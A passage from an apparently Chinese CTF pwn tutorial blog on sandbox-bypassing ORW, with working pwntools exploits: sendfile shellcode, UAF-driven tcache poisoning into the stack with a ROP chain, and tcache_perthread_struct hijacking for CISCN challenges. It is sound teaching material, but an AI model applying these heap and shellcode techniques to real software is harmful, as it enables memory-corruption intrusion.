+<img src="https://s2.loli.net/2024/05/30/aD7JNuxIqbrSivg.png" alt="image.png" /><br />
+得了，咱寄存器别找了，手搓汇编吧，但要找函数代替品也不简单…</p>
+<p>来看看它的<code>sendfile</code>代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+<p>sendfile是一个<strong>用于在文件描述符之间高效传输数据的系统调用</strong>，它在<strong>两个文件描述符之间传输数据</strong>而不<strong>需要在用户空间进行数据缓冲</strong>，从而提高性能</p>
+<p>out_fd表示的是目标文件描述符。<strong>数据将被写入到这个文件描述符</strong>，一般来是<code>stdout</code>(做堆的师傅们应该常见这玩意)，用于输出到屏幕，可以粗略理解为write的fd</p>
+<p>in_fd是源文件描述符，<strong>数据将从这个文件描述符读取</strong>，可以粗略理解为read的fd为3的情况</p>
+<p>offset不必多言，就是<strong>从文件内容offset字节处开始读取</strong></p>
+<p>count也不必多言，n_bytes</p>
+<p>了解完了这些就可以手搓汇编了</p>
+<h6 id="payload-3"><a class="markdownIt-Anchor" href="#payload-3"></a> Payload</h6>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&quot;amd64&quot;</span>,os= <span class="string">&#x27;linux&#x27;</span>,terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;xyctf.top&quot;,60030 )</span></span><br><span class="line">libc  =ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_str_asmencode</span>(<span class="params">content: <span class="built_in">str</span></span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        out = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out <span class="comment">#将str转换为十六进制数，并在开头补上&quot;0x&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> p.recvline()==<span class="string">b&#x27;show your magic again\n&#x27;</span>:</span><br><span class="line">    shellcode=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi,rsi;</span></span><br><span class="line"><span class="string">    mov rbx,<span class="subst">&#123;convert_str_asmencode(<span class="string">&quot;/flag&quot;</span>)&#125;</span>;</span></span><br><span class="line"><span class="string">    push rbx;</span></span><br><span class="line"><span class="string">    mov rdx,0;   #设置oflag为0</span></span><br><span class="line"><span class="string">    mov r10,0;</span></span><br><span class="line"><span class="string">    mov rdi,3;   #文件描述符3</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov eax,257; #openat的系统调用号</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi,3;  #in_fd</span></span><br><span class="line"><span class="string">    mov r10,50; #n_bytes</span></span><br><span class="line"><span class="string">    xor rdx,rdx;</span></span><br><span class="line"><span class="string">    mov rdi,rdx;</span></span><br><span class="line"><span class="string">    inc rdi;    #out_fd</span></span><br><span class="line"><span class="string">    mov eax,40; #sendfile的系统调用号</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,0;</span></span><br><span class="line"><span class="string">    mov rax,60; #exit</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload1 =asm(shellcode)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下<br />
+<img src="https://s2.loli.net/2024/05/27/OHALjlQYCwIsozn.png" alt=" 2024-05-27 200827.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/ghUn57oifscbA8S.png" alt=" 2024-05-27 200948.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/ZzlguI691ytkDcb.png" alt=" 2024-05-27 201100.png" /></p>
+<h3 id="禁用open和openat"><a class="markdownIt-Anchor" href="#禁用open和openat"></a> 禁用open和openat</h3>
+<h4 id="例题-2024强网杯初赛-baby_heap"><a class="markdownIt-Anchor" href="#例题-2024强网杯初赛-baby_heap"></a> 例题 2024强网杯初赛 baby_heap</h4>
+<p>因为没保存草稿又懒得再重新写一遍，我就直接发<a href="%5B%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA-%E8%AE%B0%E4%B8%80%E9%81%93%E5%BC%BA%E7%BD%91%E6%9D%AFPwn%E9%A2%98%E2%80%94%E2%80%94baby_heap%5D(https://forum.butian.net/share/3896)">链接</a>，也是我写的</p>
+<h2 id="堆上的orw"><a class="markdownIt-Anchor" href="#堆上的orw"></a> 堆上的ORW</h2>
+<p>不仅栈上有ORW，堆上当然也有ORW，不过堆上的ORW调用情况比栈上的更麻烦，要考虑的变量多了</p>
+<h3 id="纯rop链的orw"><a class="markdownIt-Anchor" href="#纯rop链的orw"></a> 纯ROP链的ORW</h3>
+<p>这个“纯”的意思是没有配合其它函数，而是通过单纯控制堆块来在程序返回地址处来ORW。</p>
+<h4 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h4>
+<p>这种ORW通常都是<strong>通过environ函数（环境变量）泄露出当前函数的返回地址</strong>，通过修改bins中堆的fd指针为ret，申请到该地址后，在后面布置ORW的ROP链来获得flag</p>
+<h4 id="例题-ciscn-2022-华东北bigduck"><a class="markdownIt-Anchor" href="#例题-ciscn-2022-华东北bigduck"></a> 例题 [CISCN 2022 华东北]bigduck</h4>
+<p>来看看程序是什么样的</p>
+<p>经典menu题(所有的函数名和变量名我自己已经改过了)</p>
+<p><img src="https://s2.loli.net/2024/05/27/lausEqIC398HY1P.png" alt=" 2024-05-27 211702.png" /></p>
+<p>仅申请堆而没有操作</p>
+<p><img src="https://s2.loli.net/2024/05/27/k6hYP5NfjBrsDEF.png" alt=" 2024-05-27 211733.png" /></p>
+<p>经典UAF漏洞</p>
+<p><img src="https://s2.loli.net/2024/05/27/mRfsPuEq5zAJn6X.png" alt=" 2024-05-27 211746.png" /></p>
+<p>普通show</p>
+<p><img src="https://s2.loli.net/2024/05/27/ZN7xaDe53T46EVR.png" alt=" 2024-05-27 211753.png" /></p>
+<p>edit函数可改变大小并输入内容</p>
+<p><img src="https://s2.loli.net/2024/05/27/zGEavwpeJTIHh6g.png" alt=" 2024-05-27 211758.png" /></p>
+<p>有计时，开了沙箱，要ORW</p>
+<p><img src="https://s2.loli.net/2024/05/27/TaicSkOPIUXNMuh.png" alt=" 2024-05-27 211714.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/27/uz9iblEtRgycsJ1.png" alt=" 2024-05-27 212114.png" /></p>
+<h5 id="流程-2"><a class="markdownIt-Anchor" href="#流程-2"></a> 流程</h5>
+<p>通过程序可以看出，这是一道经典的UAF的menu题，虽然这题libc版本较高，为2.33，但hook函数还没被扬，但是<strong>很难用setcontext+orw</strong>，因为2.29及之后<strong>setcontext有些改变，使这样的ORW比较难以利用,gadget不好找</strong>，所以我们只能采用这种ORW。利用edit和show函数，在申请进入environ函数体内后，就可以通过show计算出edit_ret，从而布置ROP链，这就是大概思路了</p>
+<h6 id="leak_libc和heap_base"><a class="markdownIt-Anchor" href="#leak_libc和heap_base"></a> leak_libc和heap_base</h6>
+<p>先放这一阶段的Payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Idx: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Idx: \n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Idx: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add() <span class="comment">#0-7</span></span><br><span class="line">add() <span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x61</span> <span class="comment">#还要edit个a的原因是&#x27;\x00&#x27;截断，所以还要再show的基础上减去0x61(a的ASCII值)</span></span><br><span class="line">log.success(<span class="string">&#x27;main_arena==&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook==&gt;&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;environ==&gt;&#x27;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span> <span class="comment">#高版本libc会移位和异或fd指针，不过show出来只用移位</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">stack_ptr = (heap_base &gt;&gt; <span class="number">12</span>) ^ environ <span class="comment">#加进去的时候必须得移位加异或，因为libc会对fd指针进行操作</span></span><br><span class="line">log.success(<span class="string">&#x27;stack_ptr==&gt;&#x27;</span>+<span class="built_in">hex</span>(stack_ptr))</span><br><span class="line">edit(<span class="number">6</span>,p64(stack_ptr))</span><br><span class="line">add() <span class="comment">#9</span></span><br><span class="line">add() <span class="comment">#10</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#environ函数里存有程序的环境变量，通过环境变量能够计算出edit函数的ret地址</span></span><br><span class="line">log.success(<span class="string">&#x27;stack==&gt;&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">stack_base = stack - <span class="number">0x138</span> <span class="comment">#edit函数中rsp的位置</span></span><br><span class="line">log.success(<span class="string">&#x27;stack_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(stack_base))</span><br></pre></td></tr></table></figure>
+<p>给几个关键步骤的截图，方便更好理解<br />
+show(0)时泄露heap_base,如果不移位，会造成heap_base泄露错误</p>
+<p>记住这个environ和stack_ptr</p>
+<p><img src="https://s2.loli.net/2024/05/27/PcfQOGYoC6kb5ML.png" alt=" 2024-05-27 214042.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/eMJ5w72UsWoH9gK.png" alt=" 2024-05-27 214204.png" /></p>
+<p>在经过edit之后，看它的fd指针和实际的内容</p>
+<p><img src="https://s2.loli.net/2024/05/27/FMzfAUdKEy2QaWx.png" alt=" 2024-05-27 214313.png" /></p>
+<p>这就是它对堆内容进行了移位和异或的操作，实习内容和fd指针指向的位置是不一样的，是高版本的保护机制</p>
+<h6 id="orw-2"><a class="markdownIt-Anchor" href="#orw-2"></a> ORW</h6>
+<p>泄露出栈地址就好说了，先把两个堆块给free出来，用来继续伪造chunk。往edit_ret里编辑ORW即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0xc7f32</span></span><br><span class="line">pop_ret = libc_base + <span class="number">0x26699</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">flag_addr = heap_base + <span class="number">0x5d0</span> <span class="comment">#flag字符所在地址</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(pop_ret) + p64(pop_rdi) + p64(flag_addr) +p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap_base + <span class="number">0x300</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(heap_base + <span class="number">0x300</span>) + p64(puts_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#放进tcache_bins里伪造chunk</span></span><br><span class="line">edit(<span class="number">9</span>, p64((heap_base &gt;&gt; <span class="number">12</span>)^stack_base)) <span class="comment">#申请进edit的栈里</span></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">12</span>,orw) <span class="comment">#构造ORW</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>最终效果如下</p>
+<p><img src="https://s2.loli.net/2024/05/27/HeYLrEJqxFyW5h2.png" alt=" 2024-05-27 215051.png" /><br />
+<img src="https://s2.loli.net/2024/05/27/NTG8hjfc9PQrUvJ.png" alt=" 2024-05-27 215115.png" /></p>
+<h3 id="setcontextorw"><a class="markdownIt-Anchor" href="#setcontextorw"></a> setcontext+ORW</h3>
+<p>这个攻击方式主要利用setcontext函数，通过rdi寄存器控制其它寄存器，主要是利用<code>mov rsp, qword ptr [rdi + 0xa0]</code>，实现栈的迁移</p>
+<h4 id="setcontext"><a class="markdownIt-Anchor" href="#setcontext"></a> setcontext</h4>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png" alt="image" /><br />
+我框红的就是关键的地方，要提前设置好[rdi+0xa0]的内容，使我们的rsp迁过去，要在迁过去之前设置好ORW链。</p>
+<h4 id="例题-ciscn-2021-初赛silverwolf"><a class="markdownIt-Anchor" href="#例题-ciscn-2021-初赛silverwolf"></a> 例题 [CISCN 2021 初赛]silverwolf</h4>
+<p>一如既往看程序</p>
+<p>嗯，还是menu</p>
+<p><img src="https://s2.loli.net/2024/05/27/LYXeNIUjokb6ASE.png" alt=" 2024-05-27 220016.png" /></p>
+<p>add函数限制了我们的size大小，只能是tcache，并且不允许设置index</p>
+<p><img src="https://s2.loli.net/2024/05/27/oIy4hJjcM9K1gVB.png" alt=" 2024-05-27 220034.png" /></p>
+<p>UAF，不能选择index</p>
+<p><img src="https://s2.loli.net/2024/05/27/G4tYSXkNhFi3VZP.png" alt=" 2024-05-27 220039.png" /></p>
+<p>show，只show最近创造的chunk的内容</p>
+<p><img src="https://s2.loli.net/2024/05/27/97bChAdw2iLZBPU.png" alt=" 2024-05-27 220044.png" /></p>
+<p>平平无奇edit，但是也只能edit最新创造的chunk</p>
+<p><img src="https://s2.loli.net/2024/05/27/3hsdqyToaL6NGQp.png" alt=" 2024-05-27 220050.png" /></p>
+<h5 id="流程-3"><a class="markdownIt-Anchor" href="#流程-3"></a> 流程</h5>
+<p>这道题限制了我们的寻址，使我们只能操作最近申请的堆块，看似走投无路，其实还有一条小路可走，那就是劫持tcache_perthread_struct</p>
+<h6 id="tcache_perthread_struct"><a class="markdownIt-Anchor" href="#tcache_perthread_struct"></a> tcache_perthread_struct</h6>
+<p>它是<strong>在libc-2.27之后加入的，用于管理tcache_bins</strong>，大小一般为0x250或0x290</p>
+<p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，该结构体有两个数组，一个是<strong>counts</strong>，另一个是<strong>entry</strong></p>
+<p>counts的数组记录的是<strong>tcache上各个bin上的堆个数</strong>，总大小为<strong>64字节</strong></p>
+<p>entry储存的是<strong>各个指针</strong>，存储的是<strong>各个bin链表上的首chunk的fd指针</strong><br />
+而entry就储存在counts之下</p>
+<p>entry数组和counts数组都是我们的攻击目标，通过<strong>修改counts和entry，我们就能操控tcache_bins</strong></p>
+<h6 id="劫持tcache_perthread_struct"><a class="markdownIt-Anchor" href="#劫持tcache_perthread_struct"></a> 劫持tcache_perthread_struct</h6>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show() <span class="comment">#chunk的fd指针</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap_addr==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x11b0</span> <span class="comment">#heapbase，也是tcache_perthread_struct的prev与size域，不可修改，否则报错</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#申请进入了，此时已经劫持了该结构体</span></span><br></pre></td></tr></table></figure>
+<p>因为<strong>只能操作最近申请的chunk</strong>，所以我们若是想在堆块里布置ORW链，我们就<strong>需要能一次性对多个堆块进行操作</strong>，而tcache_perthread_struct恰好能满足我们想要的这个条件，所以首先就是要劫持它。</p>
+<h6 id="泄露libc"><a class="markdownIt-Anchor" href="#泄露libc"></a> 泄露libc</h6>
+<p>这里提供两种方案，一种是直接填满tcache_bins使tcache_perthread_struct进入unsorted_bins；另一种是伪造counts数组使其误以为0x250的bins已经满了，从而再free一次就可以进入unsorted_bins。</p>
+<p>先第一种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete() <span class="comment">#addr==&gt;heap_base + 0x10</span></span><br><span class="line">    edit(p64(<span class="number">0</span>) * <span class="number">2</span>) <span class="comment">#恢复counts数组结构，因为每次free都会有fd指针产生，我们并不需要它，所以得把它破坏掉，使我们能持续free</span></span><br><span class="line">delete() <span class="comment">#free tcache_perthread_struct into unsorted bins</span></span><br><span class="line">show()</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> </span><br><span class="line">log.success(<span class="string">&#x27;main_arena==&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook==&gt;&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+<p>第二种</p>
